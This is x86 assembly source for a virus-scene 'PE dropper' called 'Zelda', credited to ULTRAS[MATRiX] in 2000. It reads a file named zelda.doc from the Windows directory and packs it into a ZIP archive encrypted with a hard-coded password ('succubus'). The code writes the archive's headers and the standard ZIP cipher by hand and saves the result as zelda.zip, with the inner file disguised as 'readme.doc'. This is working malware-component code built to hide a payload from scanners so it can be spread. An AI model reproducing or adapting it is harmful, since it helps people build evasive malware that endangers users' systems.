; PE dropper
; tnx T2000


 .586p
 .model flat
 .data


extrn CreateFileA:proc
extrn CloseHandle:proc
extrn GetFileSize:proc
extrn ReadFile:proc
extrn WriteFile:proc
extrn VirtualAlloc:proc
extrn GetTickCount:proc
extrn lstrcat:proc
extrn GetWindowsDirectoryA:proc
extrn ExitProcess:proc

extrn SetCurrentDirectoryA:proc
extrn GetCurrentDirectoryA:proc
extrn GetModuleFileNameA:PROC
extrn GetModuleHandleA:PROC
extrn SetFileAttributesA:proc
extrn lstrcat:proc
extrn WritePrivateProfileStringA:proc
extrn CreateProcessA:PROC
extrn CopyFileA:PROC
extrn WaitForSingleObject:PROC
extrn DeleteFileA:PROC

FILE_ATTRIBUTE_NORMAL   EQU     00000080h
GENERIC_READ            EQU     80000000h
GENERIC_WRITE           EQU     40000000h
CREATE_ALWAYS           EQU     00000002h
OPEN_EXISTING           EQU     00000003h
PAGE_READWRITE          EQU     00000004h
MEM_RESERVE             EQU     00002000h
MEM_COMMIT              EQU     00001000h

zeldadoc        db      '\zelda.doc', 0
szdoc       db  260 dup (0)
zeldazip        db      '\zelda.zip', 0
szzip       db  260 dup (0)

local_header:   dd      04034b50h       ;local file header signature
                dw      (2*10)          ;version needed to extract
                dw      1               ;general purpose bit flag
                dw      0               ;compression method
                dw      8c28h           ;last mod file time
                dw      28e4h           ;last mod file date
lhcrc32         dd      0               ;crc-32
lhcomsize       dd      0               ;compressed size
lhuncomsize dd      0               ;uncompressed size
                dw      10              ;filename length
                dw      0               ;extra field length
                db      'readme.doc'    ;filename (variable size)
e_local_header:

Central_Header: dd      02014b50h       ;central file header signature
                dw      (2*10)          ;version made by
                dw      (2*10)          ;version needed to extract
                dw      1               ;general purpose bit flag
                dw      0               ;compression method
                dw      8c28h           ;last mod file time
                dw      28e4h           ;last mod file date
CH_CRC          dd      0               ;crc-32
CH_Compr_Size   dd      0               ;compressed size
CH_Uncompr_Size dd      0               ;uncompressed size
                dw      10              ;filename length
                dw      0               ;extra field length
                dw      0               ;file comment length
                dw      0               ;disk number start
                dw      0               ;internal file attributes
                dd      0               ;external file attributes
                dd      0               ;relative offset of local header
                db      'readme.doc'    ;filename (variable size)
End_CH:

End_CH_Dir:     dd      06054B50h       ;end of central dir signature
                dw      0               ;number of this disk
                dw      0               ;number of the disk with the
                                        ;start of the central directory
                dw      1               ;total number of entries in
                                        ;the central dir on this disk
                dw      1               ;total number of entries in
                                        ;the central dir
                dd      (End_CH-Central_Header);size of the central directory
ECD_Central_Dir dd      (Central_Header-local_header) ;offset of start of central
                                        ;directory with respect to
                                        ;the starting disk number
                dw      0               ;zipfile comment length
End_End_CH_Dir:

Cipher_Key      db      'succubus'      ; The .ZIP password.
End_Cipher_Key:

Key0            dd      305419896       ; The encryption keys.
Key1            dd      591751049
Key2            dd      878082192
            
CRC_Init        dd      0ffffffffh

filehandle      dd      0
Archive_Size    dd      0
Byte_To_CRC     db      0
Temp            dd      0

                .code
zelda_drp:

 ; ebp is always zer0

 xor ebp,ebp

 push 260
 push offset szdoc
 call GetWindowsDirectoryA

 push offset zeldadoc
 push offset szdoc
 call lstrcat

 ; Open file to encapsulate in encrypted Zip-archive

 push ebp
 push ebp
 push OPEN_EXISTING
 push ebp
 push ebp
 push GENERIC_READ
 push offset szdoc
 call CreateFileA

 ; save file handle
 mov filehandle,eax

 ; get it's size
                
 push ebp
 push filehandle
 call GetFileSize

 ; fill-in some of Zip-header
 mov lhuncomsize,eax
 mov CH_Uncompr_Size,eax

 ; add size of random encryption header
 add eax,12                

 mov lhcomsize,eax
 mov CH_Compr_Size,eax

 add ECD_Central_Dir,eax
 mov Archive_Size,eax

 ; allocate memory for input
 push PAGE_READWRITE          
 push MEM_RESERVE OR MEM_COMMIT
 push eax
 push ebp
 call VirtualAlloc

 mov edi,eax

 ; after the random encryption header
 add eax,12
             
 ; read-in the file to encode
 push ebp
 push offset Temp
 push Archive_Size
 push eax
 push filehandle
 call ReadFile

 ; close doc filez
 push filehandle
 call CloseHandle

 ; get windoze directory
 push 260
 push offset szzip
 call GetWindowsDirectoryA

 ; correct path
 push offset zeldazip
 push offset szzip
 call lstrcat

 ; create zip file
 push ebp
 push FILE_ATTRIBUTE_NORMAL
 push CREATE_ALWAYS
 push ebp
 push ebp
 push GENERIC_WRITE
 push offset szzip
 call CreateFileA

 ; construct the zip-package ( tnx t2000)
 mov filehandle,eax
 call Generate_Zip

 ; write Local File Header
 push (e_local_header-local_header)
 pop ecx
 mov edx,offset local_header
 call Write_File

 ; write encoded file packet.
 mov ecx,Archive_Size
 mov edx,edi
 call Write_File

 ; Write Central File Header + End Of Central Directory.
 push (End_End_CH_Dir-Central_Header)
 pop ecx
 push offset Central_Header
 pop edx
 call Write_File

 ; close filez
 push filehandle
 call CloseHandle

Exit:          
 push ebp
 call ExitProcess

Write_File:
 push ebp
 push offset Temp
 push ecx
 push edx
 push filehandle
 call WriteFile
 retn

vx db "Zelda by ULTRAS[MATRiX] (c) 2000",13,13
   db "Thanx Z0MBiE, T2000",13,13
   db "Greetz: all VX scene",0

Generate_Zip:
 pushad
 ; initialize the 3 encryption keys with the password
 push (End_Cipher_Key-Cipher_Key)
 pop ecx
 mov esi, offset Cipher_Key
Init_Keys:      
 lodsb
 ; update keys with AL.
 call Update_Keys
 loop Init_Keys

 ; Generate a random 12-byte encryption header.
 push edi
 call GetTickCount            

 ; This header should be fully random but this 
 ; will do aswell (less code).
 xor eax,0DEADBEEFh
 stosd

 ; u like it t2000....
 add eax, -666
 stosd
 
 ; calculate the CRC of the stored data.
 mov ecx,lhuncomsize
 mov esi,edi
 call CRC

 ; save it....
 mov lhcrc32,eax            
 mov CH_CRC,eax
 dec edi
 
 ; the last byte of the random encryption header 
 ; must be the high byte of the CRC.
 rol eax,(1*8)
 stosb
 pop edi

 ; encrypt the random encryption header
 ; and the actual data stream.
 mov ecx, lhcomsize
Encrypt_Stream: 
 mov eax, Key2
 or al,2
 mov ebx,eax
 xor al,1
 mul bx
 xor ah,[edi]
 xchg [edi],ah
 mov al,ah
 call Update_Keys
 inc edi
 loop Encrypt_Stream
 popad
 retn

 ; updates the 3 encryption keys with the character in AL.
Update_Keys:
 pushad
 mov edx,Key0
 call Update_CRC
 not eax
 mov Key0,eax
 movzx eax,al
 add eax,Key1
 mov ecx,134775813
 mul ecx
 inc eax
 mov Key1,eax
 mov edx,Key2
 shr eax,(3*8)
 call Update_CRC
 not eax
 mov Key2,eax
 popad
 retn

Update_CRC:
 push 1
 pop ecx
 mov CRC_Init,edx
 mov esi,offset Byte_To_CRC
 mov [esi],al
CRC:        
  ; original code by Sepultura.
 push edx
 push esi
 push -1
 pop edx
 xchg CRC_Init,edx
 cld
Load_Character: 
 lodsb
 xor dl,al
 mov al,8
CRC_Byte:       
 shr edx,1
 jnc Loop_CRC_Byte  
 xor edx,0EDB88320h

Loop_CRC_Byte:  
 dec al
 jnz CRC_Byte
 loop Load_Character

Exit_Calc_CRC:  
 xchg edx,eax
 not eax
 pop esi
 pop edx
 retn
      
 end zelda_drp
